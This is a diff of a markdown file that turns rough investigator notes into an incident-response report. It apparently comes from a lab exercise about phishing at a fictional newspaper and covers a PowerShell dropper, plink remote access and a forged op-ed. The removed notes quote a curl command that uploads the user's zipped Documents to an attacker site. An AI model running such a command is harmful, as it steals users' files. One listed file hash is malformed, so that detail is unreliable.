@@ -1,31 +1,31 @@
-# Notes
-The editor Nene Leaks of the Valorian times wakes up to a scandaloous article posted about Luffy a known environmental activist was involved in a secret land deal but Nene did not approve of this article to be posted.
-Last person to review articles is the Newspaper Printer Clark Kent who received the final draft from the intern Ronnie Mclovin
-Ronnie said she was in charge of another post but never got to sedn it due to oversleeping but CLark Kent swore he received it from an Email with the name Ronnie Mclovin.
-CLark Kent recived an email from Ronnie on January 31st with the subject line URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))
-The doc received in the email was named OpEdFinal_to_print.docx
-Senior Editor Sonia Gose says she might have some infromation to help us during our investigation.
-She showed us a phishing email sent at 2024-01-05 09:42:05+00:00 where the sender email was newspaper_jobs@gmail.com
-The URL in the email was to a doc file offering a job oppurtunity - https://promotionrecruit[.]com/published/Valdorian_Times_Editorial_Offer_Letter.docx
-She clicked the loink at 2024-01-05 10:23:17+00:00
-The docx file in the link she clicked was Valdorian_Times_Editorial_Offer_Letter.docx
-She downlaoded the file on her device UL0M-MACHINE on 2024-01-05 10:24:04+00:00
-The SHA-256 of the file is 60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f
-The powershell script written to disk after downloading the docx was hacktivist_manifesto.ps1
-It created three different unique events. One was the first time it ran one was the schtask to make it run recurringly and one was for it bypass policy
-plink.exe is run for 136.130.190.181 on port 3389 for RDP
-Another suspicous address found was valdorias_best_recruiter@gmail.com
-The email was sent to Ronnie Mclovin at 2024-01-10 08:48:16+00:00
-Email had a link to https://promotionrecruit[.]org/share/Editorial_J0b_Openings_2024.docx
-Ronnie CLicked the link on 2024-01-10 08:55:07+00:00
-Editorial_J0b_Openings_2024.docx was downloaded to his machine at 2024-01-10 08:55:17+00:00
-hacktivist_manifesto.ps1 was dropped into his machine at 2024-01-10 08:55:51+00:00
-168.57.191.100 was used with Plink on Ronnie's machine A37A-DESKTOP
-Investigative buddy found the following suspicious file on Ronnie's machine fakestory.docx the link it was downlaoded from is https://hire-recruit[.]org/files/fakescandal/2024/fakestory.docx
-Sha-256 of fakestory.docx is 5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f
-Fakestory.docx was created on Ronnie's desktop at 2024-01-31 09:47:51+00:00
-New file path for fakestory.docx was C:\\Users\\romclovin\\Documents\\OpEdFinal_to_print.docx which was the file sent to CLark Kent by Ronnie McLovin
-User's memes, documents and Desktop were also stolen and is being sold on the dark web.
-Attacker exfiltarted all zipped data via the cmd curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php
+# Incident Response
+## Background 
+User: Ronnie Mclovin  
 
+Type of Incident: Phishing Email and BEC  
 
+Date: 01/31/2024 
+
+## Executive Sumamry
+A scandalous article was posted by the Valorian Times of the environemental activist by the name of Luffy was involved in a shady land deal but it was not approved by the Editiorial Director Nene Leaks. The person who approves the final draft is the newspaper printer Clark Kent who then said he received this draft from the Editorial Intern Ronnie Mclovin. Ronnie said she overslept and was not able to send the final draft but Clark Kent was sure that he received an email with the sender as Ronnie Vincent which had the subject line URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper)) which wa sverified in email logs. The document attached in the email was OpEdFinal_to_print.docx. While investigating a Senior Editor Sonia Gose said she might have some information that could help us duirng our investigation. She showed us an email she received from newspaper_jobs@gmail.com which was offering a job oppurtunity which she then clicked the link and a file with the name Valdorian_Times_Editorial_Offer_Letter.docx when the file is opened a powershell script with the name hacktivist_manifesto.ps1 was downloaded and ran which then bypassed its policy made a schtask to rerun it and then one to open a plink session for the atatcker to remotely control the user's machime. Another suspicious email that sent a phishing email to Ronnie Mclovin was found and had the file Editorial_J0b_Openings_2024.docx which then ran the same powershell script and created a plink session to let the attacker remotely control the machine from the IP 168.57.191.100 which then downloaded the docuemnt fakestorydocx from a web location which was then moved to the documents folder and renamed OpEdFinal_to_print which is the final that was sent to the newpaper printer Clark Kent and was then posted on the Valorian Times front page. The user's memes, docuemnts and Desktop files were zipped and locked with a password and exfiltrated to the website https://hirejob[.]com/exfil_processor/upload.php and teh information was found being sold on the Dark Web.
+
+## Appendix
+| User | Hostname | 
+| --- | --- |
+| Ronnie McLovin | A37A-DESKTOP |
+| Sonia Gose | UL0M-MACHINE |
+
+| File | Hash |
+| --- | --- |
+| Valdorian_Times_Editorial_Offer_Letter.docx | 60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f |  
+| fakestory.docx(OpEdFinal_to_print.docx) | 5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | 
+
+| Email Address | Link Provided |
+| --- | --- |
+| newspaper_jobs@gmail.com | https://promotionrecruit[.]com/published/Valdorian_Times_Editorial_Offer_Letter.docx |
+| valdorias_best_recruiter@gmail.com | https://promotionrecruit[.]org/share/Editorial_J0b_Openings_2024.docx | 
+
+| Hostname | Attacker Remote IP |
+| --- | --- |
+| UL0M-MACHINE | 136.130.190.181 |
+| A37A-DESKTOP | 168.57.191.100 | 
